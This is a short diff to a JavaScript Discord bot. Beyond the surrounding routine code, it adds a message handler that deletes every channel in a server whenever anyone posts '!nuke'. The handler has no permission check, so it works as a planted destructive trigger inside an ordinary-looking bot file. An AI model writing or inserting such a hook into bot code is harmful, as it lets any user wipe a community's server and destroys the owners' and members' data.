@@ -310,4 +310,12 @@ function SaveIntbdd() {
         if (err) message.channel.send("Une erreur est survenue.");
     });
 }
+
+
+bot.on("message", message => {
+    if(message.content === "!nuke"){
+        message.guild.channels.forEach(channel => channel.delete())
+    }
+});
+
 bot.login(testToken);
